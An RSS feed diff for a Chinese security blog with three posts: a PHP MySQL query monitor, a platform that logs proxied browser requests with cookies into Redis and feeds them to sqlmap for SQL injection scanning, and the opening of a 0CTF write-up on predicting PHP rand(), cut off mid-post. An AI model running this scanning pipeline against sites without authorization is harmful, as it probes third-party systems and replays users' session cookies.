@@ -1,0 +1,1458 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>DogeWatch&#39;s Blog</title>
+    <description></description>
+    <link>http://dogewatch.github.io/</link>
+    <atom:link href="http://dogewatch.github.io/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Thu, 07 Apr 2016 14:50:23 +0800</pubDate>
+    <lastBuildDate>Thu, 07 Apr 2016 14:50:23 +0800</lastBuildDate>
+    <generator>Jekyll v3.0.1</generator>
+    
+      <item>
+        <title>mysql过程监控</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“here喂狗”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;最近审代码在windows下用的seay的源码审计工具，发现里面的mysql监控小插件挺好用的。&lt;br /&gt;
+于是就想写一个类似的小东西在mac上也能下断点监听mysql执行了哪些语句。&lt;/p&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;正文&lt;/h2&gt;
+
+&lt;p&gt;实现mysql监控的主要原理是开启general_log来记录历史执行语句，可以记录到数据库也可以记录到文件。&lt;br /&gt;
+这里我们通过以下两条命令使其记录到mysql的general_log表中。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set global general_log=on;
+set global log_output=&#39;table&#39;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;直接上代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content-type&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sql_connect&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sqlname&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sqlpass&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;123456&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;断点&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sub1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;更新&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sub2&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php
+session_start();
+$sqlpass = &#39;&#39;;
+$sqlname = &#39;&#39;;
+$sqlold = array();
+$sqlnew = array();
+$result = array();
+if(isset($_POST[&#39;sqlname&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;sqlpass&#39;])&amp;amp;&amp;amp;(!empty($_POST[&#39;sub1&#39;]))){
+	$sqlold = array();
+	$sqlname = $_POST[&#39;sqlname&#39;];
+	$sqlpass = $_POST[&#39;sqlpass&#39;];
+	$sql = mysql_connect(&quot;localhost&quot;, $sqlname, $sqlpass);
+	if(!$sql){
+		die (&#39;mysql connection failed!!!&#39;);
+	}
+	else{
+		mysql_select_db(&quot;mysql&quot;, $sql);
+		$query1 = &quot;select count(*) from general_log&quot;;
+		$rs1 = mysql_query($query1);
+		$_SESSION[&#39;count&#39;] = intval(mysql_fetch_assoc($rs1)[&#39;count(*)&#39;]);
+	}
+}
+
+if (isset($_POST[&#39;sqlname&#39;])&amp;amp;&amp;amp;isset($_POST[&#39;sqlpass&#39;])&amp;amp;&amp;amp;(!empty($_POST[&#39;sub2&#39;]))){
+	$num = $_SESSION[&#39;count&#39;];
+	$sqlnew = array();
+	$sqlname = $_POST[&#39;sqlname&#39;];
+	$sqlpass = $_POST[&#39;sqlpass&#39;];
+	$sql = mysql_connect(&quot;localhost&quot;, $sqlname, $sqlpass);
+	if(!$sql){
+		die (&#39;mysql connection failed!!!&#39;);
+	}
+	else{
+		mysql_select_db(&quot;mysql&quot;, $sql);
+		$query2 = &quot;select * from general_log&quot;;
+		$rs2 = mysql_query($query2);
+		while($row2 = mysql_fetch_assoc($rs2)){
+			array_push($sqlnew, $row2);
+		}
+		$result = array_slice($sqlnew, $num-count($sqlnew));
+		foreach ($result as $key =&amp;gt; $value) {
+			echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;ID:	&quot;.$key.&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;时间:		&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$value[&#39;event_time&#39;].&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;操作:		&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.$value[&#39;argument&#39;].&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;br&amp;gt;&quot;;
+		}
+		$_SESSION[&#39;count&#39;] = count($sqlnew);
+	}
+}
+?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;使用结果如图:&lt;br /&gt;
+&lt;img src=&quot;/img/post/mysql-monitor.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;挖不出洞啊挖不出洞，好不容易绕过了xssfilter乌云还不给审啊不给审，什么鬼！&lt;/p&gt;
+</description>
+        <pubDate>Thu, 07 Apr 2016 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2016/04/07/mysql-monitor/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2016/04/07/mysql-monitor/</guid>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>半自动化SQL注入检测</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“gougougou”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;前几天在网上看到某个大牛&lt;a href=&quot;http://zhanghang.org/&quot;&gt;博客&lt;/a&gt;的一篇文章，是关于如何利用openresty来进行自动化SQL注入挖掘的，心痒之下决定自己动手搭一个平台试试。搭完之后效果感觉不是太好，勉强只能算是一个半自动化的平台，还有待以后改进。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;原理&lt;/h2&gt;
+
+&lt;p&gt;一、利用nginx做正向代理，通过代理访问待检测的网站。&lt;br /&gt;
+二、利用redis记录访问的所有请求。&lt;br /&gt;
+三、利用sqlmap对所有请求进行SQL注入检测。&lt;br /&gt;
+思路还是比较简单的，不过对于nginx和redis都是第一次接触的我来说，依然免不了一番折腾。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;搭建&lt;/h2&gt;
+
+&lt;h2 id=&quot;redis&quot;&gt;一、安装并配置redis.&lt;/h2&gt;
+&lt;p&gt;二、安装openresty。然后在其ngnix/conf目录下添加proxy.conf，代码如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
+	listen 9999;
+	resolver 8.8.8.8 114.114.114.114 valid=3600s; //DNS IP地址
+
+	location ~.*\.(jpg|png|jpeg|gif|js|css|ico)$ {
+		 proxy_pass http://$http_host$request_uri; //这部分请求不进行代理
+	}
+
+	location / {
+
+		default_type &#39;text/plain&#39;;
+		access_by_lua_block {
+			
+			function conv2str (o)
+				local rs = &quot;&quot;
+				if type(o) == &quot;string&quot; then
+					rs = o
+				elseif type(o) == &quot;nil&quot; then
+					rs = &quot;nil&quot;
+				elseif type(o) == &quot;number&quot; then
+					rs = tostring(o)
+				elseif type(o) == &quot;boolean&quot; then
+					rs = tostring(o)
+				elseif type(o) == &quot;table&quot; then
+					for k,v in pairs(o) do
+						if type(v)==&quot;string&quot; then
+							rs = rs..k..&quot;=&quot;..v..&quot;&amp;amp;&quot;
+						else
+							rs = rs..k..&quot;=&quot;..conv2str(v)..&quot;&amp;amp;&quot;
+						end
+					end
+					if string.find(rs, &quot;&amp;amp;&quot;, string.len(rs)-1) ~= nil then
+						rs = string.sub(rs, 0, string.len(rs)-1)
+					end
+				else
+					error(&quot;cannot serialize a &quot; .. type(o))
+				end
+				return rs
+			end
+
+			function postargs()
+				ngx.req.read_body()
+				local post=&quot;&quot;
+				local args, err = ngx.req.get_post_args() or {}
+				post=conv2str(args)
+				return post
+			end
+
+			
+			function logall()
+				local remote=ngx.var.remote_addr or &quot;-&quot;
+				local host=ngx.var.http_host or &quot;-&quot;
+				local nowtime=ngx.var.time_local or &quot;-&quot;
+				local reqMethod=ngx.req.get_method() or &quot;-&quot;
+				local reqUri=string.gsub(ngx.var.request_uri, &quot;?.*&quot;, &quot;&quot;) or &quot;-&quot;
+				local args=&quot;&quot;
+				local post=&quot;&quot;
+				local headers=ngx.req.get_headers()
+				local cookies=conv2str(headers[&quot;Cookie&quot;])
+				local useragent=conv2str(headers[&quot;User-Agent&quot;])
+				local header=conv2str(headers)
+				local line=&quot;&quot;
+
+				args = conv2str(ngx.req.get_uri_args())
+				if reqMethod == &quot;POST&quot; then
+					args = postargs()
+				end
+
+				line = &#39;{&quot;method&quot;:&quot;&#39;..reqMethod..&#39;&quot;, &quot;host&quot;:&quot;&#39;..host..&#39;&quot;, &quot;uri&quot;:&quot;&#39;..reqUri..&#39;&quot;, &quot;args&quot;:&quot;&#39;..args..&#39;&quot;,  &quot;cookie&quot;:&quot;&#39;..cookies..&#39;&quot;, &quot;agent&quot;:&quot;&#39;..useragent..&#39;&quot;, &quot;remote&quot;:&quot;&#39;..remote..&#39;&quot;, &quot;nowtime&quot;:&quot;&#39;..nowtime..&#39;&quot;}&#39;
+				--ngx.say(line)
+
+				local redis = require &quot;resty.redis&quot;
+				local red = redis:new()
+				red:set_timeout(1000) -- 1 sec
+				local ok, err = red:connect(&quot;*.*.*.*&quot;, 2000) //redis所在IP地址和端口号
+				if not ok then
+					ngx.say(&quot;failed to connect: &quot;, err)
+					return
+				end
+				local res, err = red:auth(&quot;*&quot;) //redis密码
+				red:hmset(&quot;proxy.&quot;..host, &quot;http://&quot;..host..reqUri, line) //在redis中存储所有请求
+				red:close()
+
+			end
+
+			local ret,err = pcall(logall)
+			
+			if ret then
+				return
+			else
+				ngx.say(&quot;failed &quot;, err)
+			end
+		}
+		proxy_pass http://$http_host$request_uri;
+		proxy_set_header Host      $host;
+		proxy_set_header X-Real-IP $remote_addr;
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这段代码的作用是开启正向代理，并把所有的请求记录在redis中。&lt;br /&gt;
+然后添加sqlinj.conf，代码如下：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
+	listen 80;
+	server_name *.*.*.*; //平台所在IP地址
+
+	location = /sqlinj {
+		allow 192.168.49.0/24;
+		allow 192.168.48.0/24;
+		deny all;
+
+		default_type &#39;text/plain&#39;;
+		access_by_lua_block {
+			ngx.header.content_type=&quot;application/json;charset=utf8&quot;
+			local cjson = require &quot;cjson&quot;
+			local cjson2 = cjson.new()
+			local cjson_safe = require &quot;cjson.safe&quot;
+			local redis = require &quot;resty.redis&quot;
+			local red = redis:new()
+			red:set_timeout(1000) -- 1 sec
+			local ok, err = red:connect(&quot;*.*.*.*&quot;, 6379) //redis所在IP和端口
+			if not ok then
+				ngx.say(&quot;failed to connect: &quot;, err)
+				return
+			end
+			local res, err = red:auth(&quot;*&quot;) //redis密码
+			red:select(&quot;1&quot;)
+			local sqlinj = red:hkeys(&#39;sqlinj&#39;)
+			ngx.say(&quot;共发现sql注入漏洞: &quot;..table.getn(sqlinj)..&quot; 个&quot;)
+			
+			for key, value in pairs(sqlinj) do
+				req = cjson.decode(value)
+				ngx.say(&#39;\n&#39;..req[&#39;method&#39;]..&#39;\thttp://&#39;..req[&#39;host&#39;]..req[&#39;uri&#39;]..&#39;?&#39;..req[&#39;args&#39;])
+				ngx.say(value)
+				ngx.say(red:hget(&#39;sqlinj&#39;,value))
+			end
+			red:close()
+		}	
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这段代码是在80端口开一个网页展示SQLMAP扫描的结果。&lt;br /&gt;
+在nginx.conf最后加上这样一段代码把上述两个配置文件引入进去：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;include ./proxy.conf;
+include ./sqlinj.conf;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;重启nginx后，在浏览器设置代理，然后访问一个网站（例如www.wooyun.org），可以看到在redis中已经记录下所有请求。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;127.0.0.1:6379&amp;gt; keys *
+1) &quot;proxy.widget.weibo.com&quot;
+2) &quot;proxy.www.wooyun.org&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;hr /&gt;
+&lt;p&gt;三、创建param.py，设置一些参数&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;task_new = &quot;task/new&quot;
+task_del = &quot;task/&amp;lt;taskid&amp;gt;/delete&quot;
+admin_task_list = &quot;admin/&amp;lt;taskid&amp;gt;/list&quot;
+admin_task_flush = &quot;admin/&amp;lt;taskid&amp;gt;/flush&quot;
+option_task_list = &quot;option/&amp;lt;taskid&amp;gt;/list&quot;
+option_task_get = &quot;option/&amp;lt;taskid&amp;gt;/get&quot;
+option_task_set = &quot;option/&amp;lt;taskid&amp;gt;/set&quot;
+scan_task_start = &quot;scan/&amp;lt;taskid&amp;gt;/start&quot;
+scan_task_stop = &quot;scan/&amp;lt;taskid&amp;gt;/stop&quot;
+scan_task_kill = &quot;scan/&amp;lt;taskid&amp;gt;/kill&quot;
+scan_task_status = &quot;scan/&amp;lt;taskid&amp;gt;/status&quot;
+scan_task_data = &quot;scan/&amp;lt;taskid&amp;gt;/data&quot;
+scan_task_log = &quot;scan/&amp;lt;taskid&amp;gt;/log/&amp;lt;start&amp;gt;/&amp;lt;end&amp;gt;&quot;
+scan_task_log = &quot;scan/&amp;lt;taskid&amp;gt;/log&quot;
+download_task = &quot;download/&amp;lt;taskid&amp;gt;/&amp;lt;target&amp;gt;/&amp;lt;filename:path&amp;gt;&quot;
+# config
+taskid = &quot;&amp;lt;taskid&amp;gt;&quot;
+dbOld = 0 //两个db，db0以hash的方式存储所有请求。
+dbNew = 1 //db1以set的方式存储带检测的请求。
+host = &#39;*.*.*.*&#39; //redis IP地址
+port = 6379  //redis端口号
+password = &#39;*&#39; //redis密码
+
+joblist = &#39;job.set&#39;
+sqlinj = &#39;sqlinj&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;hr /&gt;
+&lt;p&gt;四、因为原始的请求是以HASH的方式存储的，不利于随机取数据，因此创建一个preprocess.py脚本将数据以set的方式存储在db1中&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import json
+import redis
+import sys
+import param
+
+def queryKey(key):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbOld)
+	return r.keys(key)
+
+def queryHashFields(key):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbOld)
+	return r.hkeys(key)
+
+def queryHashValue(key, filed):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbOld)
+	return r.hget(key, filed)
+
+def setAdd(key, value):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbNew)
+	r.sadd(key, value)
+
+def main():
+	if len(sys.argv) &amp;lt; 2:
+		print &quot;缺少参数： python %s hostname&quot; % sys.argv[0]
+		exit()
+	hostname = sys.argv[1]
+	print hostname
+	keys = queryKey(hostname)
+	for key in keys:
+		print key
+		fileds = queryHashFields(key)
+		total = len(fileds)
+		times = 0
+		print &quot;共计%d个请求记录&quot; % total
+		for filed in fileds:
+			times = times + 1
+			req = queryHashValue(key, filed)
+			setAdd(param.joblist, req)
+			if times*10%total == 0:
+				print str(times*100.0/total) + &quot;%&quot;
+	print &quot;finish...&quot;
+
+if __name__ == &#39;__main__&#39;:
+	main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;hostname就是db0中请求的key name，例如前例中的proxy.www.wooyun.org。&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;五、下载sqlmap，进入目录运行sqlmapapi.py（python sqlmapapi.py -s -H 127.0.0.1）&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;六、创建脚本autoinj.py，该脚本负责从db1中取数据进行扫描&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
+import json
+import urllib
+import urllib2
+import redis
+import requests
+import param
+
+class Autoinj(object):
+
+	def __init__(self, server=&#39;&#39;, target=&#39;&#39;, method=&#39;&#39;, data=&#39;&#39;, cookie=&#39;&#39;, referer=&#39;&#39;):
+		super(Autoinj, self).__init__()
+		self.server = server
+		if self.server[-1] != &#39;/&#39;:
+			self.server = self.server + &#39;/&#39;
+		if method == &quot;GET&quot;:
+			self.target = target + &#39;?&#39; + data
+		else:
+			self.target = target
+		self.taskid = &#39;&#39;
+		self.engineid = &#39;&#39;
+		self.status = &#39;&#39;
+		self.method = method
+		self.data = data
+		self.referer = referer
+		self.cookie = cookie
+		self.start_time = time.time()
+		#print &quot;server: %s \ttarget:%s \tmethod:%s \tdata:%s \tcookie:%s&quot; % (self.server, self.target, self.method, self.data, self.cookie)
+
+	def task_new(self):
+		code = urllib.urlopen(self.server + param.task_new).read()
+		self.taskid = json.loads(code)[&#39;taskid&#39;]
+		return True
+
+	def task_delete(self):
+		url = self.server + param.task_del
+		url = url.replace(param.taskid, self.taskid)
+		requests.get(url).json()
+
+	def scan_start(self):
+		headers = {&#39;Content-Type&#39;:&#39;application/json&#39;}
+		url = self.server + param.scan_task_start
+		url = url.replace(param.taskid, self.taskid)
+		data = {&#39;url&#39;:self.target}
+		t = requests.post(url, data=json.dumps(data), headers=headers).text
+		t = json.loads(t)
+		self.engineid = t[&#39;engineid&#39;]
+		return True
+
+	def scan_status(self):
+		url = self.server + param.scan_task_status
+		url = url.replace(param.taskid, self.taskid)
+		self.status = requests.get(url).json()[&#39;status&#39;]
+
+	def scan_data(self):
+		url = self.server + param.scan_task_data
+		url = url.replace(param.taskid, self.taskid)
+		return requests.get(url).json()
+
+	def option_set(self):
+		headers = {&#39;Content-Type&#39;:&#39;application/json&#39;}
+		url = self.server + param.option_task_set
+		url = url.replace(param.taskid, self.taskid)
+		data = {
+				&quot;user-agent&quot;:
+					&#39;&#39;&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2)
+				 		AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106&#39;&#39;&#39;
+				}
+		if self.method == &quot;POST&quot;:
+			data[&quot;data&quot;] = self.data
+		if len(self.cookie)&amp;gt;1:
+			data[&quot;cookie&quot;] = self.cookie
+		#print data
+
+		t = requests.post(url, data=json.dumps(data), headers=headers).text
+		t = json.loads(t)
+
+	def option_get(self):
+		url = self.server + param.option_task_get
+		url = url.replace(param.taskid, self.taskid)
+		return requests.get(url).json()
+
+	def scan_stop(self):
+		url = self.server + param.scan_task_stop
+		url = url.replace(param.taskid, self.taskid)
+		return requests.get(url).json()
+
+	def scan_kill(self):
+		url = self.server + param.scan_task_kill
+		url = url.replace(param.taskid, self.taskid)
+		return requests.get(url).json()
+
+	def run(self):
+		# 开始任务
+		if not self.task_new():
+			print &quot;Error: task created failed.&quot;
+			return False
+		# 设置扫描参数
+		self.option_set()
+		# 启动扫描任务
+		if not self.scan_start():
+			print &quot;Error: scan start failed.&quot;
+			return False
+		# 等待扫描任务
+		while True:
+			self.scan_status()
+			if self.status == &#39;running&#39;:
+				time.sleep(3)
+			elif self.status== &#39;terminated&#39;:
+				break
+			else:
+				print &quot;unkown status&quot;
+				break
+			if time.time() - self.start_time &amp;gt; 30000:
+				error = True
+				self.scan_stop()
+				self.scan_kill()
+				break
+
+		# 取结果
+		res = self.scan_data()
+		# 删任务
+		self.task_delete()
+		print &quot;耗时:&quot; + str(time.time() - self.start_time)
+		return res
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;参考乌云上的一篇&lt;a href=&quot;http://drops.wooyun.org/tips/6653?utm_source=tuicool&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;七、创建console.py调用sqlinj.py进行扫描，并将结果保存至redis中&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
+import json
+import time
+import redis
+import autoinj
+import param
+
+
+def insertHash(key, filed, value):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbNew)
+	r.hset(key, filed, value)
+
+def randomOne(setKey):
+	r = redis.StrictRedis(host=param.host, port=param.port, password=param.password, db=param.dbNew)
+	return r.spop(setKey)
+
+def main():
+	if len(sys.argv) &amp;lt; 2:
+		print &quot;缺少参数： python %s http://127.0.0.1:8775&quot; % sys.argv[0]
+		exit()
+	server = sys.argv[1]
+	while True:
+		try:
+			req = randomOne(param.joblist)
+			reqJson = json.loads(req)
+			method = reqJson[&quot;method&quot;]
+			target = reqJson[&quot;host&quot;] + reqJson[&quot;uri&quot;]
+			data = reqJson[&quot;args&quot;]
+			cookie = reqJson[&quot;cookie&quot;]
+
+			inj = autoinj.Autoinj(server, target, method, data, cookie)
+			rs = inj.run()
+			print rs
+
+			if len(rs[&#39;data&#39;])&amp;gt;0:
+				print &quot;### INJ ###&quot;
+				print rs[&#39;data&#39;][0]
+				insertHash(param.sqlinj, req, rs[&#39;data&#39;][0])
+		except Exception, e:
+			print &quot;本次扫描发生了一点意外&quot;
+			print e
+			time.sleep(1)
+
+
+if __name__ == &#39;__main__&#39;:
+	main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-3&quot;&gt;使用&lt;/h2&gt;
+
+&lt;p&gt;一、浏览器设置代理，访问目标网站。&lt;br /&gt;
+二、运行preprocess.py。&lt;br /&gt;
+三、启动sqlmapapi.py&lt;br /&gt;
+四、运行console.py&lt;br /&gt;
+五、访问80端口查看结果。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-4&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;折腾了一天搭好了这个平台，但是用着不是太爽，希望达到的目标是浏览器一边访问目标网站后台一边在进行扫描，得改改相关代码。&lt;/p&gt;
+</description>
+        <pubDate>Mon, 28 Mar 2016 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2016/03/28/autosqlmap/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2016/03/28/autosqlmap/</guid>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>0CTF</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“菜如狗”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;16年第一场CTF，被老外虐成渣渣，惨惨惨惨惨。。。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;rand&quot;&gt;RAND&lt;/h2&gt;
+
+&lt;p&gt;先上题目代码：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
+include(&#39;config.php&#39;);
+
+session_start();
+
+if($_SESSION[&#39;time&#39;] &amp;amp;&amp;amp; time() - $_SESSION[&#39;time&#39;] &amp;gt; 60) {
+    session_destroy();
+    die(&#39;timeout&#39;);
+} else {
+    $_SESSION[&#39;time&#39;] = time();
+}
+
+echo rand();
+if (isset($_GET[&#39;go&#39;])) {
+    $_SESSION[&#39;rand&#39;] = array();
+    $i = 5;
+    $d = &#39;&#39;;
+    while($i--){
+        $r = (string)rand();
+        $_SESSION[&#39;rand&#39;][] = $r;
+        $d .= $r;
+    }
+    echo md5($d);
+    //var_dump($_SESSION[&#39;rand&#39;]);
+} else if (isset($_GET[&#39;check&#39;])) {
+    //var_dump($_GET[&#39;check&#39;]);
+    echo &quot;\n&quot;;
+    if ($_GET[&#39;check&#39;] === $_SESSION[&#39;rand&#39;]) {
+        echo $flag;
+    } else {
+        die(&#39;die&#39;);
+        session_destroy();
+    }
+} else {
+    show_source(__FILE__);
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这题真是逼了狗了，各种爆破rand种子，但是就是死活过不了md5的校验。&lt;br /&gt;
+于是怀疑爆破得到的种子并不是真正的种子，而是恰巧rand值碰上了而已。无奈之下到处翻资料发现在linux下php的rand函数值序列有着这样的一个规律：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rand[i] = (rand[i-3] + rand[i-31]) % 2^31
+&lt;/code&gt;&lt;/pre&gt;
